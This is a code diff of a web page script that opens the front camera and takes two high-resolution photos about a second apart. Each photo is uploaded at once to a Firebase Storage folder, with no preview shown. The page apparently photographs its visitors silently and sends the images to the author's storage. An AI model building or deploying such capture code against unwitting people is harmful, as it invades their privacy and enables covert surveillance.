@@ -24,14 +24,14 @@
         const storage = getStorage(app);
 
         // Function to upload image to Firebase
-        function uploadImage(imageData) {
-            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
+        function uploadImage(imageData, imageNumber) {
+            const storageRef = ref(storage, `Zeyad/image_${Date.now()}_${imageNumber}.png`); // Upload to Zeyad folder
             uploadString(storageRef, imageData, 'data_url')
                 .then(() => {
-                    console.log('Uploaded a blob or file!');
+                    console.log(`Uploaded image ${imageNumber}!`);
                 })
                 .catch((error) => {
-                    console.error('Error uploading image:', error);
+                    console.error(`Error uploading image ${imageNumber}:`, error);
                 });
         }
 
@@ -49,25 +49,35 @@
             navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: { exact: "user" }, // Use front camera
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }                    
+                    width: { ideal: 1920 }, // High resolution
+                    height: { ideal: 1080 } // High resolution
                 }
             })
             .then(stream => {
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    // Set the canvas size for 1080p
-                    canvas.width = 1920;  // Set canvas width to 1920 for 1080p
-                    canvas.height = 1080; // Set canvas height to 1080 for 1080p
 
-                    // Capture image after a short delay
+                    // Set the canvas size to match the video resolution
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Take the first picture immediately
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/png');
-                        uploadImage(imageData); // Upload image to Firebase
-                        stopVideo(stream); // Stop the video stream
-                    }, 1000); // Capture after 1 second
+                        const imageData1 = canvas.toDataURL('image/png');
+                        uploadImage(imageData1, 1); // Upload first image to Firebase
+
+                        // Take the second picture after a short delay
+                        setTimeout(() => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData2 = canvas.toDataURL('image/png');
+                            uploadImage(imageData2, 2); // Upload second image to Firebase
+
+                            // Stop the video stream
+                            stopVideo(stream);
+                        }, 1000); // 1 second delay between pictures
+                    }, 100); // Small delay to ensure the camera is ready
                 };
             })
             .catch(err => {
